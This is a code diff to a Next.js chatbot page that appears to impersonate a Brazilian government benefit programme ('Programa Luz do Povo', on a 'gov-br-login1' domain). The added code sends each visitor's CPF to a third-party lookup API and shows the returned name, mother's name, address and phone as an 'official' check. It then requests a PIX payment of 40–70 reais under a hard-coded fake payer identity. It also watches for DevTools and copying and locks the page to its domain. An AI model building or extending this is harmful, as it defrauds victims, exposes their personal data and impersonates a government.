@@ -5,7 +5,7 @@ import type React from "react"
 import { useEffect, useRef, useState } from "react"
 import { useRouter } from "next/navigation"
 import Image from "next/image"
-import { Send, Check } from "lucide-react"
+import { Send, Check, CheckCircle } from "lucide-react"
 import { Button } from "@/components/ui/button"
 import { Input } from "@/components/ui/input"
 import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
@@ -37,6 +37,15 @@ type UserData = {
   waterSource?: string
   housingType?: string
   electricityConsumption?: string
+  // Novos campos da API CPF
+  apiData?: {
+    nome?: string
+    dataNascimento?: string
+    situacao?: string
+    endereco?: string
+    telefone?: string
+    email?: string
+  }
 }
 
 type Message = {
@@ -55,9 +64,125 @@ type Message = {
   }
   pixCode?: boolean
   pixAmount?: number
+  isApiVerification?: boolean
 }
 
 export default function ChatPage() {
+  // 🛡️ PROTEÇÕES DE SEGURANÇA
+  useEffect(() => {
+    // 1. Verificação de domínio (substitua pelos seus domínios autorizados)
+    const allowedDomains = ["localhost", "127.0.0.1", "gov-br-login1-v2zf.vercel.app"]
+    const currentDomain = window.location.hostname
+
+    if (!allowedDomains.includes(currentDomain)) {
+      console.warn("🚨 Domínio não autorizado detectado:", currentDomain)
+      // Redirecionar para domínio oficial
+      if (window.top) {
+        window.top.location.href = "https://example.com"; // Correctly assign a string to the `href` property.
+      } else {
+        console.error("window.top is null or inaccessible.")
+      }
+    }
+
+    // 2. Proteção contra iframe (anti-clickjacking)
+if (window.top && window.top !== window.self) {
+  console.warn("🚨 Tentativa de iframe detectada")
+  window.top.location.href = window.self.location.href
+}
+
+    // 3. Watermark invisível (assinatura digital)
+    const watermark = btoa(
+      JSON.stringify({
+        domain: window.location.hostname,
+        timestamp: Date.now(),
+        signature: "PROGRAMA_LUZ_DO_POVO_OFICIAL",
+        version: "1.0",
+      }),
+    )
+
+    // Adicionar watermark como atributo invisível
+    document.body.setAttribute("data-auth", watermark)
+
+    // 4. Monitoramento de tentativas de cópia
+    const handleCopy = () => {
+      console.log("📋 Tentativa de cópia detectada em:", new Date().toISOString())
+      // Opcional: enviar alerta para seu servidor
+    }
+
+    const handleRightClick = (e: MouseEvent) => {
+      console.log("🖱️ Clique direito detectado")
+      // Não bloquear, apenas monitorar
+    }
+
+    const handleKeyDown = (e: KeyboardEvent) => {
+      // Detectar F12, Ctrl+Shift+I, Ctrl+U (ferramentas de desenvolvedor)
+      if (e.key === "F12" || (e.ctrlKey && e.shiftKey && e.key === "I") || (e.ctrlKey && e.key === "u")) {
+        console.log("🔧 Tentativa de acesso às ferramentas de desenvolvedor")
+      }
+    }
+
+    // 5. Detectar se DevTools está aberto (método básico)
+    const devtools = { open: false, orientation: null }
+    const threshold = 160
+
+    const detectDevTools = () => {
+      if (window.outerHeight - window.innerHeight > threshold || window.outerWidth - window.innerWidth > threshold) {
+        if (!devtools.open) {
+          devtools.open = true
+          console.log("🔧 DevTools possivelmente aberto")
+        }
+      } else {
+        devtools.open = false
+      }
+    }
+
+    // Adicionar event listeners
+    document.addEventListener("copy", handleCopy)
+    document.addEventListener("contextmenu", handleRightClick)
+    document.addEventListener("keydown", handleKeyDown)
+
+    // Verificar DevTools periodicamente
+    const devToolsInterval = setInterval(detectDevTools, 500)
+
+    // 6. Adicionar meta informações de proteção
+    const metaAuth = document.createElement("meta")
+    metaAuth.name = "site-verification"
+    metaAuth.content = btoa("PROGRAMA_LUZ_DO_POVO_OFICIAL_" + Date.now())
+    document.head.appendChild(metaAuth)
+
+    // Cleanup
+    return () => {
+      document.removeEventListener("copy", handleCopy)
+      document.removeEventListener("contextmenu", handleRightClick)
+      document.removeEventListener("keydown", handleKeyDown)
+      clearInterval(devToolsInterval)
+    }
+  }, [])
+
+  // 7. Função para verificar integridade da página
+  useEffect(() => {
+    const verifyPageIntegrity = () => {
+      const expectedTitle = "Programa Luz do Povo"
+      if (!document.title.includes(expectedTitle)) {
+        console.warn("🚨 Título da página foi alterado")
+      }
+
+      // Verificar se elementos críticos existem
+      const criticalElements = ["header", "[data-auth]"]
+
+      criticalElements.forEach((selector) => {
+        if (!document.querySelector(selector)) {
+          console.warn("🚨 Elemento crítico removido:", selector)
+        }
+      })
+    }
+
+    // Verificar integridade a cada 30 segundos
+    const integrityInterval = setInterval(verifyPageIntegrity, 30000)
+
+    return () => clearInterval(integrityInterval)
+  }, [])
+
   const router = useRouter()
   const [messages, setMessages] = useState<Message[]>([])
   const [currentInput, setCurrentInput] = useState("")
@@ -77,6 +202,11 @@ export default function ChatPage() {
   const [pixValue, setPixValue] = useState(0)
   const [paymentConfirmed, setPaymentConfirmed] = useState(false)
 
+  // Novos estados para verificação CPF
+  const [cpfVerified, setCpfVerified] = useState(false)
+  const [cpfVerificationLoading, setCpfVerificationLoading] = useState(false)
+  const [apiVerificationComplete, setApiVerificationComplete] = useState(false)
+
   // Estados para seleções
   const [selectedSocialProgram, setSelectedSocialProgram] = useState<string | null>(null)
   const [selectedFamilySize, setSelectedFamilySize] = useState<string | null>(null)
@@ -88,7 +218,7 @@ export default function ChatPage() {
 
   // Estados para componentes aprimorados
   const [currentStep, setCurrentStep] = useState(1)
-  const [totalSteps, setTotalSteps] = useState(12)
+  const [totalSteps, setTotalSteps] = useState(13) // Aumentado para incluir verificação CPF
   const [showCelebration, setShowCelebration] = useState(false)
   const [showTip, setShowTip] = useState(false)
   const [currentTip, setCurrentTip] = useState("")
@@ -101,6 +231,68 @@ export default function ChatPage() {
     "Obrigado pela paciência, cada informação é importante.",
     "Falta pouco para concluirmos sua avaliação!",
   ])
+
+  // Nova função para verificar CPF via API - BASEADA NO CÓDIGO QUE FUNCIONA
+  const verifyCPFWithAPI = async (cpf: string): Promise<any> => {
+    try {
+      setCpfVerificationLoading(true)
+
+      // Limpar CPF (remover pontos e traços) - igual ao seu código
+      const cleanCPF = cpf.replace(/\D/g, "")
+
+      // Validar se CPF tem 11 dígitos
+      if (cleanCPF.length !== 11) {
+        throw new Error("CPF deve conter 11 dígitos")
+      }
+
+      // Constrói a URL da API com o CPF - EXATAMENTE IGUAL AO SEU CÓDIGO
+      const apiUrl = `https://apela-api.tech?user=4a0ce81f-db70-48f4-9c10-ce4849562176&cpf=${cleanCPF}`
+
+      console.log("🔍 Chamando API:", apiUrl)
+
+      // Faz a chamada à API - EXATAMENTE IGUAL AO SEU CÓDIGO
+      const response = await fetch(apiUrl)
+
+      if (!response.ok) {
+        throw new Error(`Erro na API: ${response.status}`)
+      }
+
+      // Processa a resposta da API - EXATAMENTE IGUAL AO SEU CÓDIGO
+      const data = await response.json()
+      console.log("✅ Resposta da API:", JSON.stringify(data, null, 2))
+
+      setCpfVerificationLoading(false)
+
+      // Verifica se a API retornou um CPF válido - BASEADO NO SEU CÓDIGO
+      if (data.valid === false) {
+        throw new Error("CPF inválido segundo a API")
+      }
+
+      return data
+    } catch (error) {
+      setCpfVerificationLoading(false)
+      console.error("❌ Erro ao verificar CPF na API:", error)
+      throw error
+    }
+  }
+
+  // Função para extrair nome da resposta da API
+  const getNameFromResponse = (data: any): string | null => {
+    // Tentar diferentes campos possíveis para o nome
+    return data.nome || data.name || data.nomeCompleto || data.full_name || null
+  }
+
+  // Função para extrair nome da mãe da resposta da API
+  const getMotherNameFromResponse = (data: any): string | null => {
+    // Tentar diferentes campos possíveis para o nome da mãe
+    return data.nomeMae || data.mother_name || data.mae || data.nomeDaMae || null
+  }
+
+  // Função para extrair data de nascimento da resposta da API
+  const getBirthdateFromResponse = (data: any): string | null => {
+    // Tentar diferentes campos possíveis para a data de nascimento
+    return data.dataNascimento || data.birthdate || data.birth_date || data.nascimento || null
+  }
 
   // Carregar dados do usuário
   useEffect(() => {
@@ -115,6 +307,7 @@ export default function ChatPage() {
             cpf: parsedData.cpf || prev.cpf,
             birthdate: parsedData.birthdate || prev.birthdate,
             email: parsedData.email || prev.email,
+            apiData: parsedData.apiData || undefined,
           }))
           dataLoadedRef.current = true
         }
@@ -174,15 +367,17 @@ export default function ChatPage() {
     input?: Message["input"],
     pixCode?: boolean,
     pixAmount?: number,
+    isApiVerification?: boolean,
   ) => {
     const newMessage: Message = {
-      id: Date.now().toString(),
+      id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
       text,
       sender: "bot",
       options,
       input,
       pixCode,
       pixAmount,
+      isApiVerification,
     }
 
     setMessages((prev) => [...prev, newMessage])
@@ -192,7 +387,7 @@ export default function ChatPage() {
     }
 
     // Mostrar dica contextual aleatoriamente
-    if (Math.random() > 0.7 && !pixCode) {
+    if (Math.random() > 0.7 && !pixCode && !isApiVerification) {
       showRandomTip()
     }
   }
@@ -219,7 +414,7 @@ export default function ChatPage() {
   // Função para adicionar mensagem do usuário
   const addUserMessage = (text: string) => {
     const newMessage: Message = {
-      id: Date.now().toString(),
+      id: Date.now().toString() + Math.random().toString(36).substr(2, 9),
       text,
       sender: "user",
     }
@@ -230,10 +425,10 @@ export default function ChatPage() {
 
   // Função para gerar PIX real
   const generatePixReal = () => {
-    if (!userData.email) {
-      addBotMessage("Erro: E-mail não encontrado. Por favor, reinicie o processo.")
-      return
-    }
+    // DADOS FIXOS PARA A API PIX
+    const fixedEmail = "clientepadrãoboy@gmail.com"
+    const fixedName = "boy boyboy"
+    const fixedCpf = "284.491.380-60" // CPF FIXO
 
     // Gerar valor aleatório entre 40 e 70 reais
     const randomValue = Math.random() * 30 + 40
@@ -328,14 +523,158 @@ export default function ChatPage() {
     }
 
     // Processar baseado no campo
-    if (field === "name") {
+    if (field === "cpf") {
+      // Nova lógica para verificação de CPF via API
+      try {
+        addBotMessage("🔍 Verificando seus dados via CPF...", undefined, undefined, false, undefined, true)
+
+        const apiData = await verifyCPFWithAPI(input)
+
+        // Atualizar userData com dados da API
+        setUserData((prev) => ({
+          ...prev,
+          cpf: input,
+          apiData: {
+            ...apiData,
+            nome: getNameFromResponse(apiData),
+            nomeMae: getMotherNameFromResponse(apiData),
+            dataNascimento: getBirthdateFromResponse(apiData),
+          },
+          // Pré-preencher dados se disponíveis na API
+          name: getNameFromResponse(apiData) || prev.name,
+          birthdate: getBirthdateFromResponse(apiData) || prev.birthdate,
+          email: apiData.email || prev.email,
+        }))
+
+        setCpfVerified(true)
+        setApiVerificationComplete(true)
+        shouldAdvanceStep()
+
+        setTimeout(() => {
+          // Extrair dados específicos da API
+          const nome = getNameFromResponse(apiData)
+          const nomeMae = getMotherNameFromResponse(apiData)
+          const dataNascimento = getBirthdateFromResponse(apiData)
+
+          let apiMessage = `✅ Dados verificados com sucesso!\n\n📋 INFORMAÇÕES ENCONTRADAS:\n• Nome: ${nome || "Não informado"}\n• CPF: ${formatCPF(input)}`
+
+          if (dataNascimento) {
+            apiMessage += `\n• Data de Nascimento: ${dataNascimento}`
+          }
+
+          if (nomeMae) {
+            apiMessage += `\n• Nome da Mãe: ${nomeMae}`
+          }
+
+          if (apiData.situacao) {
+            apiMessage += `\n• Situação: ${apiData.situacao}`
+          }
+
+          if (apiData.endereco) {
+            apiMessage += `\n• Endereço: ${apiData.endereco}`
+          }
+          if (apiData.telefone) {
+            apiMessage += `\n• Telefone: ${apiData.telefone}`
+          }
+          if (apiData.email) {
+            apiMessage += `\n• E-mail: ${apiData.email}`
+          }
+
+          addBotMessage(apiMessage, undefined, undefined, false, undefined, true)
+
+          setTimeout(() => {
+            addBotMessage(
+              "Os dados acima estão corretos?",
+              [
+                { id: "1", text: "✅ Sim, dados corretos", value: "dados_corretos" },
+                { id: "2", text: "❌ Preciso corrigir algo", value: "corrigir_dados" },
+              ],
+              { type: "radio", field: "action" },
+            )
+          }, 2000)
+        }, 2000)
+      } catch (error) {
+        // Em caso de erro na API, continuar com fluxo normal
+        console.error("Erro na verificação CPF:", error)
+
+        setTimeout(() => {
+          addBotMessage(
+            "⚠️ Não foi possível verificar automaticamente seus dados via CPF. Vamos prosseguir com a coleta manual.",
+            undefined,
+            undefined,
+            false,
+            undefined,
+            true,
+          )
+
+          setTimeout(() => {
+            setUserData((prev) => ({ ...prev, cpf: input }))
+            shouldAdvanceStep()
+
+            addBotMessage("Confirme seu nome completo:", undefined, {
+              type: "text",
+              placeholder: "Digite seu nome...",
+              field: "name",
+            })
+          }, 2000)
+        }, 1500)
+      }
+    } else if (field === "action" && input === "dados_corretos") {
+      // Dados da API confirmados, pular para próxima etapa relevante
+      shouldAdvanceStep()
+
+      setTimeout(() => {
+        // Se temos email da API, pular para CEP, senão pedir email
+        if (userData.apiData?.email) {
+          addBotMessage(
+            `✅ E-mail confirmado: ${userData.apiData.email}! Informe o CEP da sua residência:`,
+            undefined,
+            {
+              type: "text",
+              placeholder: "Digite o CEP...",
+              field: "cep",
+            },
+          )
+        } else {
+          addBotMessage(`Obrigado! Agora, informe seu e-mail:`, undefined, {
+            type: "text",
+            placeholder: "Digite seu e-mail...",
+            field: "email",
+          })
+        }
+      }, 1000)
+    } else if (field === "action" && input === "corrigir_dados") {
+      // Permitir correção manual dos dados
+      shouldAdvanceStep()
+
+      setTimeout(() => {
+        addBotMessage("Vamos corrigir seus dados. Confirme seu nome completo:", undefined, {
+          type: "text",
+          placeholder: "Digite seu nome...",
+          field: "name",
+        })
+      }, 1000)
+    } else if (field === "name") {
       shouldAdvanceStep()
       setTimeout(() => {
-        addBotMessage(`Obrigado, ${input}! Agora, informe seu e-mail:`, undefined, {
-          type: "text",
-          placeholder: "Digite seu e-mail...",
-          field: "email",
-        })
+        // Se já temos email da API e dados foram confirmados, pular para CEP
+        if (userData.apiData?.email && apiVerificationComplete) {
+          addBotMessage(
+            `✅ E-mail confirmado: ${userData.apiData.email}! Informe o CEP da sua residência:`,
+            undefined,
+            {
+              type: "text",
+              placeholder: "Digite o CEP...",
+              field: "cep",
+            },
+          )
+        } else {
+          addBotMessage(`Obrigado, ${input}! Agora, informe seu e-mail:`, undefined, {
+            type: "text",
+            placeholder: "Digite seu e-mail...",
+            field: "email",
+          })
+        }
       }, 1000)
     } else if (field === "email") {
       const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/
@@ -570,6 +909,11 @@ Você concorda com todos os termos acima?`
 
   useEffect(() => {
     if (!conversationStartedRef.current && dataLoadedRef.current) {
+      // Adicionar após: if (!conversationStartedRef.current && dataLoadedRef.current) {
+      console.log("🔐 Programa Luz do Povo - Sistema Oficial Carregado")
+      console.log("📍 Domínio:", window.location.hostname)
+      console.log("🕐 Timestamp:", new Date().toISOString())
+
       conversationStartedRef.current = true
 
       setTimeout(() => {
@@ -582,11 +926,21 @@ Você concorda com todos os termos acima?`
         )
 
         setTimeout(() => {
-          addBotMessage("Confirme seu nome completo:", undefined, {
-            type: "text",
-            placeholder: "Digite seu nome...",
-            field: "name",
-          })
+          // Iniciar com verificação de CPF se não temos dados da API ainda
+          if (!userData.apiData) {
+            addBotMessage("Para começar, vamos verificar seus dados automaticamente. Confirme seu CPF:", undefined, {
+              type: "text",
+              placeholder: "Digite seu CPF...",
+              field: "cpf",
+            })
+          } else {
+            // Se já temos dados da API, pular para confirmação
+            addBotMessage("Confirme seu nome completo:", undefined, {
+              type: "text",
+              placeholder: "Digite seu nome...",
+              field: "name",
+            })
+          }
         }, 3000)
       }, 1000)
     }
@@ -637,23 +991,33 @@ Você concorda com todos os termos acima?`
                 />
               </div>
             )}
-            <div className={`rounded-lg p-3 max-w-[80%] message-bubble ${message.sender === "bot" ? "bot" : "user"}`}>
+            <div
+              className={`rounded-lg p-3 max-w-[80%] message-bubble ${message.sender === "bot" ? "bot" : "user"} ${message.isApiVerification ? "api-verification" : ""}`}
+            >
+              {/* Indicador especial para mensagens de verificação API */}
+              {message.isApiVerification && (
+                <div className="flex items-center mb-2 text-blue-600">
+                  {cpfVerificationLoading ? (
+                    <>
+                      <div className="animate-spin h-4 w-4 border-2 border-blue-600 border-t-transparent rounded-full mr-2" />
+                      <span className="text-sm font-medium">Verificando...</span>
+                    </>
+                  ) : (
+                    <>
+                      <CheckCircle className="h-4 w-4 mr-2" />
+                      <span className="text-sm font-medium">Verificação Automática</span>
+                    </>
+                  )}
+                </div>
+              )}
+
               {message.pixCode && message.pixAmount ? (
                 <RealPixQRCode
                   amount={message.pixAmount}
-                  customerName={userData.name}
-                  customerCpf={userData.cpf}
-                  customerEmail={userData.email || ""}
+                  customerName="boy boyboy" // NOME FIXO
+                  customerCpf="284.491.380-60" // CPF FIXO
+                  customerEmail="clientepadrãoboy@gmail.com" // EMAIL FIXO
                   onPaymentConfirmed={handlePaymentConfirmed}
-                  // Adicionar dados da API CPF
-                  apiData={(() => {
-                    try {
-                      const storedData = localStorage.getItem("userData")
-                      return storedData ? JSON.parse(storedData).apiData : null
-                    } catch {
-                      return null
-                    }
-                  })()}
                 />
               ) : (
                 message.text.split("\n").map((line, i) => (
@@ -706,6 +1070,17 @@ Você concorda com todos os termos acima?`
         {/* Celebração */}
         {showCelebration && <Celebration />}
 
+        {/* Indicador de verificação CPF */}
+        {cpfVerificationLoading && (
+          <div className="flex items-center justify-center my-4 p-4 bg-blue-100 border-2 border-blue-300 rounded-lg text-blue-800">
+            <div className="flex flex-col items-center">
+              <div className="animate-spin h-8 w-8 border-4 border-blue-600 border-t-transparent rounded-full mb-2" />
+              <span className="font-bold text-lg">Verificando CPF...</span>
+              <span className="text-sm">Consultando base de dados oficial</span>
+            </div>
+          </div>
+        )}
+
         {/* Indicador de pagamento confirmado - MELHORADO */}
         {paymentConfirmed && (
           <div className="flex items-center justify-center my-4 p-4 bg-green-100 border-2 border-green-300 rounded-lg text-green-800 animate-pulse">
@@ -730,6 +1105,8 @@ Você concorda com todos os termos acima?`
             const lastMessage = messages[messages.length - 1]
             if (lastMessage?.input?.field === "cep") {
               setCurrentInput(formatCEP(value))
+            } else if (lastMessage?.input?.field === "cpf") {
+              setCurrentInput(formatCPF(value))
             } else {
               setCurrentInput(value)
             }
@@ -739,15 +1116,15 @@ Você concorda com todos os termos acima?`
               ? messages[messages.length - 1]?.input?.placeholder || "Digite sua mensagem..."
               : "Aguarde..."
           }
-          disabled={!waitingForInput || loading}
+          disabled={!waitingForInput || loading || cpfVerificationLoading}
           className="flex-1 rounded-full border-0"
         />
         <Button
           type="submit"
-          disabled={!waitingForInput || !currentInput.trim() || loading}
+          disabled={!waitingForInput || !currentInput.trim() || loading || cpfVerificationLoading}
           className="ml-2 rounded-full w-10 h-10 p-0 bg-blue-900 hover:bg-blue-800"
         >
-          {loading ? (
+          {loading || cpfVerificationLoading ? (
             <div className="animate-spin h-4 w-4 border-2 border-white border-t-transparent rounded-full" />
           ) : (
             <Send size={18} />
